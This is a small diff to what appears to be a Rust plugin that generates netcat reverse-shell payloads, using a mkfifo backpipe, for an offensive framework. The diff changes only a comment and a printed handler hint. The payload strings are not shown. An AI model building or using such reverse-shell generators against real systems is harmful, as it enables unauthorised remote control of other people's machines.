@@ -89,7 +89,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
         None => { eprintln!("[-] LPORT required"); return 1; }
     };
 
-    // Generate random backpipe name like Metasploit
+    // Generate random backpipe name
     let backpipe = rand_alpha(5);
 
     // Standard netcat with mkfifo
@@ -118,7 +118,7 @@ extern "C" fn run(_instance: *mut c_void, config: *const c_char) -> c_int {
     println!("{}", payload_ncat);
 
     println!("\n[*] Note: Use Option 1 for most compatibility");
-    println!("[*] Ensure handler is listening: use exploit/multi/handler");
+    println!("[*] Ensure handler is listening: use utilities/multi_handler");
 
     0
 }
